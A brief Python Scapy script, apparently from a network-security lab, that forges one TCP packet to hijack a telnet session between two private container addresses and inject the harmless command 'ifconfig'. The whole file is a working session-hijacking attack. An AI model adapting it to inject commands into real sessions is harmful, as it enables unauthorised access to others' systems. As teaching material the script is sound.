#!/usr/bin/python3
from scapy.all import *

print("SENDING SESSION HIJACKING PACKET.........")

ip  = IP(src="172.17.0.3", dst="172.17.0.2")
tcp = TCP(sport=56824, dport=23, flags="A", seq=3991190403, ack=2286647430)
data = "\n ifconfig\n"
pkt = ip/tcp/data
send(pkt, verbose=0)